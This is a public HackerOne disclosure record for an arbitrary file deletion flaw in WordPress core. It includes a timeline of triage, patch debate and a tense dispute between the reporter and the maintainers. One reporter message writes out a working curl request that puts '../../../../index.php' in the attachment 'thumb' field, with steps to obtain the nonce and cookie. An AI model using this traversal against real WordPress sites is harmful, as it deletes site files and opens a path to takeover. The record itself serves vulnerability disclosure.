---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/path-traversal
  - env/web
  - stack/wordpress
substate: "resolved"
weakness: "Path Traversal"
enriched: true
date: 2018-08-29
submitted: 2017-11-20T13:57:40.409Z
bounty_usd: null
votes: 17
cve: []
program: "[[programs/wordpress|WordPress]]"
reporter: "b258ea62bf297b02afa9854"
source: "https://hackerone.com/reports/291878"
title: "Arbitrary file deletion in wp-core - guides towards RCE and information disclosure"
---
# Arbitrary file deletion in wp-core - guides towards RCE and information disclosure

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 17 | **Program:** WordPress | **Disclosed:** 2018-08-29

- Report: [https://hackerone.com/reports/291878](https://hackerone.com/reports/291878)
- CWE: Path Traversal
- Submitted: 2017-11-20T13:57:40.409Z

## Timeline

- **Report Filed**
- **2017-11-20** @voldemortensen: Hey @slavco, thank you for reporting this to us. I just wanted to let you know that I'm taking a look at this right now.
- **2017-11-22** @b258ea62bf297b02afa9854: Hi there,
Any problems with this one? It is reported 2 days ago and status is not changed. If there is something unclear feel free to ask.
- **Report Triaged**
- **2017-11-22** @b258ea62bf297b02afa9854: Data you need to place in the request below in order to work attack: 
[THIS DATA YOU NEED FROM YOUR LOCAL TARGET]
```
curl 'http://LOCAL.TARGET/wp-admin/post.php?post=[MEDIA_ID]&action=editattachment&_wpnonce=[WPNONCE_USED_TO_EDIT_MEDIA]' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Cookie: [PLACE YOUR COOKIE VALUES HERE - EXPORT FROM BROWSER]' -H 'Connection: keep-alive' -d 'thumb=../../../../index.php' --compressed
```
- [MEDIA_ID] is your post / media ID
- [WPNONCE_USED_TO_EDIT_MEDIA] change caption of media file and use the same wpnonce for the request above
- Same applies for cookie values

after that simply delete permanently file and something like this will be input towards `@unlink` :
`/your/local/path/wp/wp-content/uploads/2017/11/../../../../index.php`
- **2017-11-22** @voldemortensen: Awesome, thank you for the extra information. Looks like I was using the wrong post ID and nonce (using for the post as opposed to the media). I'll try this.

Assuming I can validate this (and I'm sure I will), what is your recommended fix?
- **2017-11-22** @b258ea62bf297b02afa9854: Validate it first, then we can jump into real problem. I would suggest, if possible, your side ( wp core team ) to provide patch then if needed maybe I can say something, but I really doubt it would be taken into consideration :)
- **2017-11-22** @voldemortensen: Again, thanks for that extra info, with it I was able to reproduce the issue. I'll start working on a patch and pass it along when I've got something.
- **2017-12-12** @b258ea62bf297b02afa9854: What is the status of this one? Any progress?
- **2017-12-18** @voldemortensen: Hey @slavco, sorry for the silence on this one. Between school, work, family, and the holidays, I haven't had as much time as I would have hoped to work on this. Initially I thought we could just call `validate_file` on the file path, but currently relative paths are allowed and to disallow all relative paths could break quite a few sites. @jjj had a good idea regarding this. He suggested migrating everything to `wp_delete_file` and not allowing anything outside of ABSPATH to be deleted (with blacklists for wp-config.php and other sensitive files). We could then add a filter to allow those who have WP_CONTENT_DIR outside of ABSPATH to keep working.

> but I really doubt it would be taken into consideration :)
Regarding that, I'm all ears for you suggestions. I promise that I will consider any suggestions you make. I can't promise that will be the exact fix, but the more view points we have the better.

Thank you again for responsible disclosure of this.
- **2017-12-18** @b258ea62bf297b02afa9854: Nice to hear there is work in progress on this one. Any idea regarding release date (I'm not pushing here, just want to know what is expected release date for this fix)
- **2018-01-09** @b258ea62bf297b02afa9854: Hi all, any activity on this one and release date if possible ?
- **Hacker Requested Mediation**
- **2018-01-21** @aaroncampbell: Hey @slavco,

As @voldemortensen said in his last update, holidays and other commitments have taken up a lot of his time. Unfortunately this is true for quite a few of our volunteers over the last month. Combining that with the fact that this is reproducible but definitely not simple to fix, has meant that things are taking a while. I'll see if I can get someone else to lend a hand to try to speed things up here, but we certainly haven't forgotten about it.

Thanks,
Aaron
- **2018-01-21** @b258ea62bf297b02afa9854: Again, I know that backward compatibility is really hard to be achieved and it is time consuming. I'm asking regarding simple time frame e.g. when it is expected to be fixed. That is it. Answer could be:
- in one month
- in 6 months
- in one year
I really don't care, just want to know rough planned release date. That it is!
- **2018-01-24** @aaroncampbell: Hey @slavco,

My best estimate on this one would be somewhere around the 6 month time frame. Unfortunately we don't actually set release dates that far in advance, so it's hard to give you a date. However, it should be fixed by the end of July. I've set calendar reminders to make sure I check in on this regularly.

Thanks,
Aaron
- **2018-01-24** @b258ea62bf297b02afa9854: +1 will ping you in 6 months, before that if something is unclear feel free to poke me here.
- **2018-05-24** @b258ea62bf297b02afa9854: Hi, the issue presented here I have found while I was at ripstech. I got an email that they plan to publish it this week or next one. Do you have any info or progress on this one?
- **2018-06-27** @jjj: Hey everyone,

I've spent the past 5 hours investigating this, and am attaching what I believe is the best available patch given the circumstances and requirements.

All it does is run `$_POST['thumb']` through `validate_file()` and `wp_die()` on failure.

----

My reasoning with such a simple approach only on submission, is that WordPress does not perform any file path protection elsewhere. If we _are_ going to introduce a safety measure to prevent critical file deletion (and my personal opinion is that we should) that fix should be handled globally, in such a way that plugins and themes opting into using `wp_delete_file()` would be protected, and outside of this fix specifically.

Plugins or themes calling `unlink()` directly will always be free to behave badly, and WordPress should provide the best tooling within itself as an application to prevent accidents, while trusting the rest of the server to be configured in such a way that important application files (like WordPress core files) cannot be blindly unlinked.

----

My attached patch is a backwards compatibility break. Plugins attempting to pass a relative file path to this very-old `'thumb'` parameter (normally only accessed via a pre-3.0 admin screen) will now fail, but I believe that break is worth it here, given both the age of that code and how unlikely it is to be relied upon in the wild.

We try to get consensus from the team when backwards compatibility breaks are necessary. It's also possible my suggested fix is not the best approach, but this is my progress from tonight so I wanted to update everyone.

----

It's hard to put into words how frustrating and embarrassing it is for issues to go stale like this one did, from both sides of the issue fwiw. I'm sorry this went ignored. I know my apology means very little, but it needs to be said and I do feel all of these things.

When there is progress, one of us will update here.

Thanks,
-JJJ
- **2018-06-27** @b258ea62bf297b02afa9854: Speaking as me/Slavco personally:
 
If you take into consideration the input sanitation approach then you should make sure every place in the core where postmeta key inserting is possible to be sanitized in case of "thumb" key. This solution except breaking precious backward compatibility does very little, almost nothing from security aspect. Editors still are able to perform this attack, Authors are able to carry this attack via XMLRPC, what about wordpress-importer enabled setups, ... 

Anyone of you doesn't deserve single letter in the form of reply and help due your behavior in the previous reports from my side, but open source and safety of the users world wide are much more important than your ignorance and discrimination especially towards me.
- **2018-06-28** @aaroncampbell: Hey Slavco,

It seems like you reached out to someone pointing out that we were on the wrong track with the patch. I agree and we've been working on a very different patch for a most of the day, and when the person pinged me privately it made me realize that we hadn't uploaded the new patch here yet. I'm going to try to get the latest iteration of it and upload it here really soon.

Thanks,
Aaron
- **2018-06-28** @aaroncampbell: Here's another patch @slavco, can you take a look and tell me what you think? It brings the enforcement to where the unlinking is actually happening.

It looks like the plan will be to push out an update early next week. When this is all fixed and pushed out, we'd still like to look into some additional hardening to `wp_delete_file` and heavier usage of it throughout the codebase, but that will be a longer process.
- **2018-06-28** @aaroncampbell: There was a copy/paste error on like 30 in that last patch. Here is the fixed version.
- **2018-06-29** @b258ea62bf297b02afa9854: Solution isn't good at all. Stay tuned I'll explain in details in 3 months from now.
- **2018-06-29** @aaroncampbell: Hey Slavco,

While I like to think I appreciate sarcasm and snark as much as most, it certainly makes our job harder here. I understand that you're frustrated at the time this report took, but when you asked for a timeframe 5 months ago I estimated 6 months saying "it should be fixed by the end of July" and you said that was fine (well, you gave it a "+1").

We didn't get the full 6 months because of the RIPS post, but we really would like to get a reliable solution in place for a release next week. Any actionable feedback would be appreciated.

Thanks,
Aaron
- **2018-06-29** @b258ea62bf297b02afa9854: Now we are talking! 
I'm really happy I see you have start counting, that is good habit especially when you handle security of the most popular web project. What is said on this report here https://hackerone.com/reports/253495 , m? 
I'm also more than pleased I'm reading that my feedback "would be appreciated" due the fact wasn't the case in the past. See this https://hackerone.com/reports/179920 .
Regarding discrimination I would also like to point out to the DB prepare method debacle for you, you have acknowledge and gave reward to the person who rewrite my own work and that makes you a thief!  Yes Aaron, you personally and Matt because you are the man responsible for security of the WordPress and Matt as person who put you there. 
Now you can see that I'm not frustrated at all, opposite I'm happy seeing you in this position and that is the result of my battle towards you (not personally, but as authority ) which is noble and makes internet safer place while shows you in the real light.
Is this strange to you? Maybe I doesn't sound as a person who answered on your emails while I was reporting prepare issue on security at wordpress ? I'm the same, you and your attitude is changed, but you have overlooked very important thing and that is the one I'm not under you in the hierarchy, but we are the same, due the fact I'm the REPORTER and RESEARCHER! 
Now you can fix everything you have messed up right there https://hackerone.com/reports/179920 and feel free to contact me on any communication channel, I don't bite, I audit code ;)

p.s. 
Solution isn't good at all. Stay tuned I'll explain in details in 1 ( not 3 because you show little regret regarding the situation you put wp in) month from now.
- **2018-06-29** @aaroncampbell: Hey @slavco,

As of right now, we are targeting early next week to release a WordPress update to fix this. Obviously we don't want to release a solution that doesn't fix the issue, and we would really like to work with you on this issue. Any constructive feedback you are able to supply before then, whether in details or patches, would be greatly appreciated!

-Aaron
- **2018-06-30** @b258ea62bf297b02afa9854: Oh, you understood nothing! Please read carefully [again](https://hackerone.com/bugs?subject=user&report_id=291878&view=open&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=triaged&substates%5B%5D=pre-submission&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1#activity-2959435) You really can't notice that shameless thief without any regret who always place the guilty towards another people means nothing to me?
- **2018-06-30** @b258ea62bf297b02afa9854: Fool me [once](https://hackerone.com/reports/179920), shame on you. Fool me twice, shame on me (reports 253495 & 29187).
- **Report Triaged**
- **Report Resolved**
- **Not Eligible For Bounty**
- **2018-07-05** @b258ea62bf297b02afa9854: Good, I just want to ask, does upload directory for different users is different or all of them upload under `.../uploads/2018/07/` ? Told you that solution doesn't seems good to me and to wait one month...
- **2018-07-05** @b258ea62bf297b02afa9854: Btw, there is much more, but... Congrats for resolving the issue! 
p.s. Don't drink while you push for updates towards 30% of the web, you could make mistakes.
- **2018-07-27** @b258ea62bf297b02afa9854: In 8 days it is a month. Do you plan to fix this issue or?
- **2018-07-30** @b258ea62bf297b02afa9854: I'm not talking regarding https://medium.com/websec/wordpress-4-9-7-and-evil-author-with-scotch-bd77a83ac39c the solution you provide doesn't protect the wp from first reported issue.
- **Agreed On Going Public**
- **2018-07-30** @b258ea62bf297b02afa9854: Btw, I'm on wp slack, so anyone who wants to chat or ask something can find me there. @Slavco there too :)
- **2018-07-30** @b258ea62bf297b02afa9854: ^^ function `wp_delete_attachment_files` not meta name :)))
- **Report Became Public**
